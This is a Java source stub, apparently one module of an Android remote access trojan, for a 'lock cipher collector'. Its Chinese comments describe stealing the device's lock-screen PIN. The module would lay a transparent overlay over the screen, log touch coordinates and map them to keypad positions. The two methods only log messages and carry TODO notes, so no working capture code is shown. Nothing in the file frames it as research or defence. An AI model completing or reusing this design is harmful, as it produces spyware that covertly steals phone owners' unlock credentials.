package com.vendor.rat.data.collector;

import android.content.Context;
import android.util.Log;

/**
 * 锁屏密码采集器 (模块 05)
 *
 * 通过透明悬浮窗记录触摸坐标，映射到 PIN 按键位置
 */
public class LockCipherCollector {

    private static final String TAG = "LockCipherCollector";

    /**
     * 开始采集（息屏时调用）
     */
    public void startCapture(Context context) {
        Log.d(TAG, "Start lock cipher capture");
        // TODO: 创建透明悬浮窗，监听触摸事件
    }

    /**
     * 停止采集（亮屏时调用）
     */
    public void stopCapture() {
        Log.d(TAG, "Stop lock cipher capture");
        // TODO: 移除悬浮窗
    }
}
